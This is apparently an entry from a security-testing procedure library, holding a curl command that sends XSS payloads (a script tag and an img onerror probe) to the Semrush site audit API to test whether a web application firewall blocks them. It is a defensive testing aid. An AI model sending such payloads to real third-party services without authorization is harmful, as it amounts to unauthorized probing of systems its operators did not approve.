---
data: >-
  curl -X GET
  "https://api.semrush.com/reports/v1/projects/YOUR_PROJECT_ID/siteaudit/page/list?url=<script>alert(1)</script>"
  -H "Authorization: Bearer YOUR_API_TOKEN"
tags:
  - xss
  - waf
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:47:18.084Z'
id: ac8c328c-c712-4f95-ab15-ff4ffcbc069c
verified: false
validated: true
submitted: true
---
# curl-test-xss

## Command

```bash
curl -X GET "https://api.semrush.com/reports/v1/projects/YOUR_PROJECT_ID/siteaudit/page/list?url=<script>alert(1)</script>" -H "Authorization: Bearer YOUR_API_TOKEN"
```

## Description

Injects a standard XSS payload to test WAF response.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `url=<script>alert(1)</script>` | XSS payload | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://api.semrush.com/reports/v1/projects/123/siteaudit/page/list?url=<img src=x onerror=alert(1)>" -H "Authorization: Bearer token"
```

## Expected Output

WAF block or sanitized response.

## Related

- [[Related Procedure: Test-XSS-Payloads-Against-WAF]]
